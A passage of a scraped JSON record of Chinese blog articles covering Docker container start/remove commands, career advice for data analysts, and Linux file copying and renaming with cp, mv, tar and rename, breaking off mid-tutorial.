,ls, 命令，它将不会出现在列表中。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container ls,CONTAINER ,ID        ,IMAGE               ,COMMAND             ,CREATED             ,STATUS              ,PORTS               ,NAMES, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,所以，在这种情况下，如果想要查看停止的或不活动的容器，你需要在 ,ls, 命令里同时使用 ,-a, 参数。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   33 minutes ago      Exited (0) 2 minutes ago                       cranky_cori\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container ls -a,CONTAINER ,ID        ,IMAGE               ,COMMAND              ,CREATED             ,STATUS                     ,PORTS               ,NAMES,c46f2e9e4690        ,httpd,               ,\"httpd-foreground\",   ,33, ,minutes ,ago      ,Exited, ,(,0,), ,2, ,minutes ,ago                       ,cranky,_,cori, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,有了 ,-a, 参数，现在我们可以查看已停止的容器。注意这些容器的状态被标注为 已退出exited。既然容器只是一个进程，那么用“退出”比“停止”更合适！,\n,如何（重新）启动 Docker 容器？,\n,现在，我们来启动这个已停止的容器。这和运行一个容器有所区别。当你运行一个容器时，你将启动一个全新的容器。当你启动一个容器时，你将开始一个已经停止并保存了当时运行状态的容器。它将以停止时的状态重新开始运行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks #  docker container start c46f2e9e4690\r\nc46f2e9e4690\r\n\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   35 minutes ago      Up 8 seconds        0.0.0.0:80->80/tcp   cranky_cori\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,#  docker container start c46f2e9e4690,c46f2e9e4690, ,root,@,kerneltalks, ,# docker container ls -a,CONTAINER ,ID        ,IMAGE               ,COMMAND              ,CREATED             ,STATUS              ,PORTS                ,NAMES,c46f2e9e4690        ,httpd,               ,\"httpd-foreground\",   ,35, ,minutes ,ago      ,Up, ,8, ,seconds,        ,0.0.0.0,:,80,->,80,/,tcp   ,cranky,_,cori, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,如何移除 Docker 容器？,\n,我们使用 ,rm, 命令来移除容器。你不可以移除运行中的容器。移除之前需要先停止容器。你可以使用 ,-f, 参数搭配 ,rm, 命令来强制移除容器，但并不推荐这么做。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@kerneltalks # docker container rm cranky_cori\r\ncranky_cori\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,kerneltalks, ,# docker container rm cranky_cori,cranky_cori,root,@,kerneltalks, ,# docker container ls -a,CONTAINER ,ID        ,IMAGE               ,COMMAND             ,CREATED             ,STATUS              ,PORTS               ,NAMES, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你看，一旦移除了容器，即使再使用 ,ls -a, 命令也查看不到容器了。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114145/", "url_object_id": "a80c1972902edd63a90d8bf1ff9bc04b", "front_image_path": "full/e488919f69e980ca011ca1f7af3988436ffd26d1.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "title": "听说你立志要做数据分析，不如先听听老司机的建议？", "create_time": "2018/06/25", "vote": "4", "bookmark": "7", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,作者 JerryHuang 推荐,   ,每年总有很多人，怀揣着对世界的一知半解、满腔似火的热情、还有对美好生活的向往，走出象牙塔，投身社会。,\n,世界很大，诱惑很多。对于未来，甚至在工作多年后，他们仍然没有清晰的方向，或者缺乏独立、深度的思考。,\n,方向很重要，而人生很短暂。往哪里走，怎么走，再怎么也得花点时间思考一下，不是吗？,\n,如果你决心要在数据科学领域有所作为，或者立志做数据分析，这篇文章提了点小建议，希望对你有所帮助。,\n,一、去大厂还是去小厂？,\n,我们做每件事之前，都要先明确做这件事的目的和意义是什么。,\n,先来问问自己，做数据分析的目的和价值是什么？我的理解是，致力于用数据帮助企业解决业务问题，辅助业务决策。,\n,关于这个问题，你可以花3-5年时间来思考和领悟，不急，但需要想清楚。,\n,你还面临一个抉择，到底是去大厂还是去小厂？,\n,之前接到很多猎头电话，不少都会问：“你是做分析还是做挖掘的呀？”刚开始，也常会和猎头在电话里“理论”一番。后来在大厂待过才明白，大厂分工比较细，分析是偏向经营分析，即取数分析写报告，而挖掘则是建模调参部署等。小厂就不一样了，谈需求、确定思路、指标设计、平台搭建、接入数据、处理数据、建立宽表、模型训练、结果分析、撰写报告、模型部署、报表计算、数据可视化等一整个流程，一个人几乎都可能会参与。,\n,如果有机会，请一定要去大厂历练几年！大厂大多都很开放，常常敢为天下先，敢于引入一些新的东西，包括技术、思维、制度，技术比较先进，优秀的人也很多。大厂的管理制度也很完善，福利待遇当然会更好些。大厂的数据规模绝对够大，而且应用场景也多，可施展的空间应该会比较大。所以，抱着学习的态度在大厂里混几年，是可以成长很快的。（有好，当然也有不好）大厂流程繁杂，整体效率偏低，提一个取数申请可能需要1-2周。大厂的内部竞争也大，存在于不同项目团队，也存在于同一部门不同成员之间。大项目资源投入大，小项目资源申请很困难，重视程度也不一样。最主要的，大厂分工很明细，不同职位的轮换似乎不大容易，从入职到几年后离开一直做经营分析都是有可能的，容易导致能力的单一，不利于个人综合素质的培养。,\n,相比之下，小厂就灵活多了，人和事都不会很复杂，而且效率也高。小厂可能会优先考虑做这件事情的投入和产出，即看应用效果。（大厂反而愿意给资源去试，短期内不怎么关注投入产出。）所以，在小厂工作，既要学会帮公司赚钱，也要学会帮公司省钱。小厂分工不会很细，大多需要一个人做多种工作。所以，小厂里面的程序员常常身怀多技。但小厂数据规模小，技术实力较弱，团队成员整体素质不高，而且项目流程不大规范，常常怎么简单怎么来，怎么高效怎么来。有些小公司的码农，除了对外发过一两封邮件，平时的沟通几乎是在QQ里，结果待了几年之后连写一封邮件都不会。有些小厂自己没有数据，重要是作为乙方给大企业做项目，这种模式常常受甲方牵制，可发挥的空间很小，而且一个项目周期往往比想象中要长（我本人之前就厌倦做乙方），因此不大建议去这样的公司。,\n,不管大厂还是小厂，在选择时，建议都要看看所要加入的团队。,\n,综合来说，建议先去大厂混几年，再去小厂找个Title高点的职位发挥自己所长。,\n,再来说几句，什么场景下分析，什么场景下挖掘呢？,\n,分析其实是一个很笼统的概念。把当前营业额跟去年同期做对比发现增长了不少，这个也可以认为是分析。分析是从数据中发现问题或规律，并提出合理的建议。分析常常伴随着要写报告，进而要给业务方汇报分析结果。最好是给决策层汇报，因为决策层有拍板的权力，而且对数据结果的感知和可能的应用有自己独到的认知。,\n,如果需要把分析的结果固化下来，定期输出结果，提供给业务方，这个时候就需要开发数据产品了。,\n,挖掘是用算法解决某个具体的复杂问题，用常规分析方法解决不了的，如客户流失预警、商品最优推荐组合、最有投递路线规划等。,\n,所以，我一般认为，分析是从数据中发现问题或规律，而挖掘是其中的一块。,\n,\n,数据技能知识一览,\n,二、1-3年，“所见即所得”，打磨基础技术,\n,在职业生涯的初期，请牢记，“所见即所得，所感即所知，多见即多得，多感即多知”。,\n,不管在大厂还是在小厂，一定要参与到实际项目当中，好好打磨自己的技术。不管是大项目还是小项目，一定要借助来之不易的机会，以极致的工匠精神修炼自身。,\n,你最好能从基础数据处理做起。只有这样，你才能早点知道，数据并不像在学校里做实验用到的数据那样“好”，它可能看起来“又脏又乱”。只有这样，你才能早点知道，给你取数的那个程序员是如何花了2-3天甚至一周时间才把数算好。,\n,如果你精通SQL，那就太好了，这样就可以直接能够在数据平台查看原始的数据了。,\n,最好要看一看最原始的数据长什么样。你不一定能一下子理解这些数据，但你可以慢慢地感受它们，因为它们所投射出来的是最真实的业务场景。,\n,举个例子吧，原始的会员注册信息数据里面，性别一般填“男”、“男性”、“女”、“女性”、“未知”、“其它”等值，但处理好之后的二手数据里面，性别就变成了“男”、“女”、“未知”等三个值了。仅看这三个值，可能会漏掉一些业务场景，填“男”可能是从移动端输入时选择的，填“男性”则可能是手工填写注册表格时勾选上的。而漏掉的这个场景，说不定就是所要找的那个分析点。,\n, ,\n,你最好还能熟练掌握一两门编程语言，比如当下流行的Python，作为入行的基础技能。（顺便说一下，码农界普遍认为只会SQL的不算真正的程序员~~）,\n,当今时代，编程已经从娃娃开始抓起。早在5年前，英国规定5岁以上儿童必须学习编程课，法国将编程列入初等教育选修课程，美国已有40个州制定政策支持计算机科学，有35个州将计算机科学课程纳入高中毕业学分体系。美国前总统奥巴马就曾在全美发起“编程一小时”的运动，旨在让全美小学生开始学习编程。2017年，浙江、北京、山东等省确定要把Python编程基础纳入信息技术课程和高考的内容体系。编程将是一项很基础的技能，也将是承接其他知识的基石。在未来，会编程很可能跟使用智能手机一样普遍。,\n,当处理基础数据的时候，必然会在数据库或数据平台上进行。你可能需要对这些存储数据的环境加以了解，如传统的结构化数据库Oracle、Mysql、DB2等，又如当下流行的Nosql数据库HBase、Redis、MongoDB、Cassandra等，再如大数据集群平台、原理及其相关概念，类似Hadoop、Hive、Hue、MapReduce、Spark、Scala、Sqoop、Pig、Zookeeper、Flume、Oozie等。你或者也需要了解数据传输的工具，如DataStage、Kafka、Sqoop等。你甚至也可能被安排做安装系统、部署软件、配置环境、同步数据等一些琐碎的工作。,\n,关于这些，如果你非常感兴趣，可以考虑往大数据平台方向发展，成为数据开发工程师、数据平台运维工程师、或者数据平台架构师。,\n,你不必理解太深，可仅仅停留在了解层面，但知道这些知识会让你和数据开发工程师、运维工程师和平台架构师沟通起来顺畅很多。,\n,当处理和分析数据时，有些关于数据的操作是必然需要掌握的。首先是常见格式的数据导入导出，如TXT、CSV、XLS，然后是主要的数据加工技巧，包括建表/视图、插入、更新、查询、并联、串联、汇总、排序、格式转换、循环、常用的函数、描述统计量、变量，等等。,\n,这些操作很基础，但不简单。你可能经常会遇到各种情况，如花了一个下午时间就是没能把一个很小的CSV数据文件正确地导入到数据库中，不是乱码就是错位，或者两表关联时老是报一些烦人的错误，或者日期字段进行格式转换时出现空值……反正状况百出，防不胜防。,\n,关于这些基础操作，需要不断积累经验，尽量能够做到在不同场景下快速高效地完成，轻松应付。,\n,如果有人已经给你取好了数，而你的工作是分析数据写报告，那么分析技巧首先是你需要培养起来的。对拿到的数据，要时刻保持疑问，不能太乐观，因为别人算好的数据未必完全是你想要的数据，又或者数据质量并不是你想的那样好。,\n,在分析之前，需要进行数据探索，看看数据质量如何。比如，你需要清楚有多少数据量，有什么信息，可衍生什么指标，缺失情况如何，如何填补缺失值，值的分布情况如何，如何处理极值，名义/字符变量是否需要转换，等等。,\n,分析时，要清楚指标不同形态的含义，如绝对值、占比、同比、趋势、均值、标准差，等等。,\n,在这里，我想指出，数据有对比才有意义。如果一个穷人捡到100元，他会很高兴，这够他吃好几天了。但如果让一个富人去捡100元，那感觉就不一样了，他可能觉得他不值得这么做，因为用弯腰去捡的时间挣到的钱远远不止这么多。,\n,统计学知识是必须要掌握的，这是基础。如果你非数学或统计学专业出身，那么请自学。,\n,另外，也请你一定要掌握主流算法的原理，比如线性回归、逻辑回归、决策树、神经网络、关联分析、聚类、协同过滤、随机森林，再深入一点，还可以掌握文本分析、深度学习、图像识别等相关的算法。,\n,关于这些算法，不仅需要了解其原理，你最好可以流畅地阐述出来，还需要你知晓其在各行业的一些应用场景。,\n,关于这些算法，你最好能够参与关于模型开发的具体项目实践。那样的话，你就可以清楚关于建模的大概流程是怎么样的，不同算法在建模中有不同，需要注意哪些地方。,\n,如果你打字速度不快，那也最好重视起来，这虽然是一个不痛不痒的问题，但也在较大程度上影响你的工作效率，进而影响到你的工作产出，当然也可能因此会影响到你的薪资哦！,\n,另外，还有一些提高工作效率的小技巧，也可以多学多掌握。例如，一些电脑的快捷键，定期保存文件，文件的归类存放和快速查找，等等。,\n,作为职场新人，你不仅需要打磨技术，纯技术之外的技能也需要不断修炼。,\n,职场的做事方式方法、为人处事以及一些潜规则，更多时候只能靠悟，说出来就可能不大好了，因此需要不断领悟。毕竟，悟性这东西是很重要的。,\n,还有，沟通是码农普遍的老大难问题，建议重视起来并加强。,\n,你甚至可以学一下投影仪或打印机怎么用。（说不定可以靠这个技能在老板或同事前面大攒人品哦~~）,\n,如果你有机会和很牛的人在一起工作，那你太幸运了。你可以多请教优秀的人一些问题，也可以平时多观察那些优秀之人的做事方式、工作习惯，看看有哪些好的地方、好的品质值得你学习。只要吸纳进来，就可以转化为你的优点，推动你进步。,\n,我毕业的第三年，看到俞敏洪老师在一些演讲中提及他大学时读了800多本书，很受触动，真正认识到了读书的重要性，于是给自己制定了一年读50本书的计划，什么书都读，三年左右时间，我的心智和心态都发生了很大的改变，完全不一样了。,\n,俗话说：“三人行，必有我师。”每个人都有每个人的优点，对于所遇到的每个人，建议多欣赏别人的优点，少抨击别人的缺点，这样你就可以“兼收并蓄”，逐步塑造更好的自己。,\n,三、3-5年，“技多不压身”，拓展能力边界,\n,当迈过了最初的3个年头后，你的技术越来越好，也做了不少项目，也越来越清楚自己未来的方向，但你也会发现有越来越多的东西还需要去学习和加强。,\n,这个时候，你的知识是零散的，还远未形成体系。你也许还需要花些时间好好梳理和总结过去几年积累的经验和知识，不断沉淀，形成自己的知识体系和方法论。在梳理的过程中，你会不断清楚自己有什么，缺什么，哪些地方弱，哪些地方强，未来需要花多少时间补强哪项技能，等等。,\n,你可以沿着数据的整个流程，即数据采集、数据存储、数据处理、数据分析/开发模型、报表计算、数据可视化，不断拓展自己的能力边界，最好在流程中的各个环节都做过项目。,\n,例如，在数据采集环节，你可以学一下爬虫技术。,\n,这个时候，你不再是新人。新人大多是等着别人安排工作，并在详细的指导之下完成。而你慢慢成长为老司机了，需要独立完成一个个任务了，如独立开发一个模型、写一份会员分析报告、梳理关于近期营业额下降原因分析的思路，等等。你需要不断适应在无人指点的情况自己去寻求问题解决办法，也可能需要应对此前没有遇到过的新情况并独立展开调查研究。几乎没有人帮你，你也没法指望别人明确告诉你怎么做。而你需要的是，历经3年之后成长路上的一个质变。,\n,在这过程中，你可能需要不断查找资料，咨询别人，并加以思考，梳理出有效的方案，最后落地执行。在这过程中，可以有效训练以下几方面的能力：,\n,\n,查找资料,\n,会问问题,\n,总结梳理,\n,写作能力,\n,\n,关于总结梳理，建议定期做，常常做，每天做，建议养成一个日常习惯。,\n,对于不同问题和场景的思路整理总结，常常需要方法论指导，如麦肯锡金字塔原理、结构化思维等。关于这些方法论，不仅要谙熟于心，也需要将其应用到实际工作当中。这是受用一生的知识，你也可将其运用到你的日常生活中，用以解决你日常的问题和需求。,\n,关于思路的整理，可以借助思维导图工具。,\n,另外，请注重培养自己的数据敏感性和数据思维，越早开始越好。关于如何培养数据思维，将以另外的文章单独阐述。,\n,EXCEL是操作和处理数据最方便的工具，也是必须掌握的办公软件。很多人会用EXCEL，但根本不精通EXCEL。简历里那句“精通EXCEL等办公软件”（你的简历里是否也这样写~~），常常是一个谎言。建议你好好学一下EXCEL，包括展示数据、透视表、函数、画图、动态图表、VBA等。不要仅仅停留在最粗的层面，比如画图，使用默认设置也可以画出一个图表，但是不好看，阅读体验不好。关于怎么用EXCEL画好图表，推荐阅读《EXCEL图表演示之道》、《最简单的图形与最复杂的信息》。,\n,写分析报告，难免会用到PPT。关于如何写好PPT这件事，从来就不是件轻松的事。但你可以给自己一些时间去学，比如3年、5年、甚至10年。刚开始，写得不好没关系，但一定不要放过每一次锻炼的机会。,\n,关于PPT的技巧，将有更多的文章单独阐述。,\n,在领导眼里，会写材料的人比会编程的人更有存在感。而且，会写材料的人总是显得那样“稀缺”。如果你是别的同事眼里的“会Coding的人中最会写PPT+会写材料的人中最懂技术”的那个人，那你将会很受重用。,\n,四、5-10年，“不忘初心”，有所为有所不为,\n,在别人眼里，数据分析和开发模型是很高大上的。但这高大上，常常处在很多尴尬的处境。数据分析汇报一次之后就没了下文，模型开发了，部署了，也定期出数了，但就是没用起来。用户方或业务方觉得这些东西对他们业务帮助不大，可有可无（虽然包装一下用来忽悠一下投资人可能也有点用处），还不如一个经验规则来得有效，简单粗暴，省时省力。,\n,关于经验规则和算法模型之争，如果你坚定认为你开发的模型比业务方所认为的经验规则更有效，那么，请你拿出“证据”，用数据说服业务方，让他们改变观念，觉得你是对的。,\n,之前信奉的那句“数据驱动业务”，是不是错了吗？,\n,此刻，请回到初心吧！我们的初心是什么？那就是用数据帮助业务解决问题，用数据辅助业务决策。数据分析只是其中一种形式，当然还有其它。因此，不要迷恋数据分析，不要迷恋算法模型。“不管黑猫白猫，抓到老鼠就是好猫。”,\n,如果你能够从数据分析和算法模型的困囿中挣脱出来，那么你将发现你面对的是广阔天地，你可以在数据的海洋里肆意遨游。,\n,你或许开始注重追求数据解决方案的实用性，强调落地执行，更看重应用效果。,\n,你必须真正理解业务方的需求。当业务方进行选品和定价时，他们需要一份关于竞品的商品数据来做参考；当业务方想随时看到当前时刻的订单量（特别是618或双11），你需要实时汇总数据并实时呈现给他们；当业务方既想看总体的经营数据，也想看各区各部门各门店的经营数据，你需要开发一个多维度层层钻取查看的功能……而这些都不是数据分析和算法模型，但这些也是数据应用，也能产生数据价值。,\n,如果有机会，不妨尝试做个数据产品经理。数据产品经理需要从产品角度实现业务功能。在当前数据产品化的趋势下，这是一个很有挑战性的事情，不容易做好。毕竟，讨好一大群用户，比单独讨好一个用户要难得多。,\n,在数据产品设计里，数据可视化是一个重要的事情。好的图表会说话，好的功能会抓住用户的心。即便撇开数据产品，我们在分析报告里也会需要数据的可视化表达。,\n,数据可视化传递的是一种明确的数据信息，一目了然，赏心悦目。从画好一个数据图表，到功能版式的精心设计，再到对功能细节良苦用心的把握，你需要不断精进。一旦你感兴趣，你将会很快沉迷于其中，因为那是一种美的表达。,\n,五、10年+，“砥砺前行”，创新、创业、创造,\n,是的，你已经做了十年，希望你无悔当初的选择与坚持。,\n,此时你也遇到很多瓶颈，或许你空有一身好武艺但得不到老板重用，或许你想做个实力派但处于各种原因离技术越来越远，或许你很努力但职务仍然上不去，或许你面对繁重的工作心有余而力不足，各种分身乏术……你一直在等待和寻找着机会，突破自己。,\n,此时你也渐渐步入了中年，或许你开始变得油腻，或许你的身材早已远离苗条，或许岁月在你的脸上、头发上开始留下痕迹，或许你的思想渐渐固化，不能与时俱进了……最重要的，或许就是你早已没有了当初的激情。,\n,如果你在一个行业待了十年，在别人眼里，无论怎样，都已是个专家，所以，请自信！,\n,你还需要在圈里有一定的影响力，需要树立个人品牌，最好能在圈里外有较好的传播。如此这样，当别人提起你的时候，他们常会这样说，“这个人分析能力很强”，“他在数据领域造诣很深”，“他建模能力出众”……如此种种，在他们眼里对你印象最深刻的标签将会是你最想要的那个。,\n,或许你需要逐步提升讲课程的能力，这是一种知识分享与传递，也是提高个人影响力的有效途径。不要放过任何露脸的机会哦！,\n,你或许已经深刻明白，分析的结果、开发的模型、数据产品只有被应用起来，才真正算是产生价值。你会越来越关注数据应用的问题。当你开始聚焦这个问题时，你会问自己，”用户或业务方真正需要什么？“这个时候，你得有用户思维了。你会加强对业务的重视程度，也会不断回到业务层面去思考数据的实际应用。,\n,你最好也时刻关注当前社会的趋势和潮流，特别是与互联网相关的。这样可以让你保持开放的心态，洞悉社会的风向，驱动自己的思考，挖掘潜在的机会。你可以从中了解当前行业中成功的数据应用案例，开拓自己的思路，多想想用数据还可以帮助各行业解决什么问题，可能的机会在哪里，自己应该怎么做。,\n,你可能要面对的是，数据应用对一个行业或一个企业来说，永远都是在探索。某个数据应用思路或项目一旦成功了，就会得到越来越多的资源投入，越做越大，如果失败了，就会立刻遭放弃。因此，要有创新精神，要有创新的勇气和自信。,\n,职位上来说，你可能开始担任一定的管理工作。因此，你还得学会团队管理，懂得如何向上管理和向下管理。,\n,你的日常事务会越来越多，你也需要学会有效管理自己的时间。你可以成为一名“清单控”。但必须指出的是，时间管理，最本质的还是自我的管理，对精力的管理。你需要开始意识到加强身体锻炼的重要性了。一来，保持身材，对发福说不，二来，保持精力的旺盛，抵抗疲倦，第三，通过不断挑战自己的身体极限来刺激自己，找回激情。,\n,你也需要开始认真考虑如何平衡工作和家庭的问题了。,\n,这个世界一直在变。我们也一定要“善变”，顺势而为。,\n,不管是10-20年前的BI（商务智能），过去几年的大数据，这年头炒得火爆的人工智能，还是未来涌现的更多概念，只要我们足够开放，敏感洞察，挖掘机会，创新、创业、创造，不断成就自己。,\n,汪国真在《热爱生命》里写道：“我不去想是否能够成功，既然选择了远方，便只顾风雨兼程。”,\n,英雄不问出身，只要你下定决心，即使再晚出发，也会达到，还可以走得更远。,\n,最后，作为数据人，与你共勉，“不做数据的搬运工，要做价值的缔造者”。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,4, 赞,\n        , 7 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114150/", "url_object_id": "52d5249e6e503caa3d53418ba9db1163", "front_image_path": "full/3ef52bc5d5cc6d23e102e0ce679d152bdd3b5cc7.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "在 Linux 上复制和重命名文件", "create_time": "2018/06/23", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sandra Henry-stocker,   译文出处：,Linux中国/geekpi,   ,cp 和 mv 之外，在 Linux 上有更多的复制和重命名文件的命令。试试这些命令或许会惊艳到你，并能节省一些时间。,\n,Linux 用户数十年来一直在使用简单的 ,cp, 和 ,mv, 命令来复制和重命名文件。这些命令是我们大多数人首先学到的，每天可能有数百万人在使用它们。但是还有其他技术、方便的方法和另外的命令，这些提供了一些独特的选项。,\n,首先，我们来思考为什么你想要复制一个文件。你可能需要在另一个位置使用同一个文件，或者因为你要编辑该文件而需要一个副本，并且希望确保备有便利的备份以防万一需要恢复原始文件。这样做的显而易见的方式是使用像 ,cp myfile myfile-orig, 这样的命令。,\n,但是，如果你想复制大量的文件，那么这个策略可能就会变得很老。更好的选择是：,\n,\n,在开始编辑之前，使用 ,tar, 创建所有要备份的文件的存档。,\n,使用 ,for, 循环来使备份副本更容易。,\n,\n,使用 ,tar, 的方式很简单。对于当前目录中的所有文件，你可以使用如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ tar cf myfiles.tar *\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,tar ,cf ,myfiles,.,tar *, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于一组可以用模式标识的文件，可以使用如下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ tar cf myfiles.tar *.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,tar ,cf ,myfiles,.,tar *,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在每种情况下，最终都会生成一个 ,myfiles.tar, 文件，其中包含目录中的所有文件或扩展名为 .txt 的所有文件。,\n,一个简单的循环将允许你使用修改后的名称来制作备份副本：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ for file in *\r\n> do\r\n> cp $file $file-orig\r\n> done\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,for, ,file ,in, ,*,>, ,do,>, ,cp, ,$,file, ,$,file,-,orig,>, ,done, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当你备份单个文件并且该文件恰好有一个长名称时，可以依靠使用 ,tab, 来补全文件名（在输入足够的字母以便唯一标识该文件后点击 ,Tab, 键）并使用像这样的语法将 ,-orig, 附加到副本的名字后。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cp file-with-a-very-long-name{,-orig}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cp, ,file,-,with,-,a,-,very,-,long,-,name,{,,,-,orig,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后你有一个 ,file-with-a-very-long-name, 和一个 ,file-with-a-very-long-name-orig,。,\n,在 Linux 上重命名文件,\n,重命名文件的传统方法是使用 ,mv, 命令。该命令将文件移动到不同的目录，或原地更改其名称，或者同时执行这两个操作。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ mv myfile /tmp\r\n$ mv myfile notmyfile\r\n$ mv myfile /tmp/notmyfile\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,mv ,myfile, ,/,tmp,$, ,mv ,myfile ,notmyfile,$, ,mv ,myfile, ,/,tmp,/,notmyfile, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,但我们也有 ,rename, 命令来做重命名。使用 ,rename, 命令的窍门是习惯它的语法，但是如果你了解一些 Perl，你可能发现它并不棘手。,\n,有个非常有用的例子。假设你想重新命名一个目录中的文件，将所有的大写字母替换为小写字母。一般来说，你在 Unix 或 Linux 系统上找不到大量大写字母的文件，但你可以有。这里有一个简单的方法来重命名它们，而不必为它们中的每一个使用 ,mv, 命令。 ,/A-Z/a-z/, 告诉 ,rename, 命令将范围 ,A-Z, 中的任何字母更改为 ,a-z, 中的相应字母。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls\r\nAgenda Group.JPG MyFile\r\n$ rename 'y/A-Z/a-z/' *\r\n$ ls\r\nagenda group.jpg myfile\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls,Agenda ,Group,.,JPG ,MyFile,$, ,rename, ,'y/A-Z/a-z/', ,*,$, ,ls,agenda ,group,.,jpg ,myfile, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以使用 ,rename, 来删除文件扩展名。也许你厌倦了看到带有 .txt 扩展名的文本文件。简单删除这些扩展名 —— 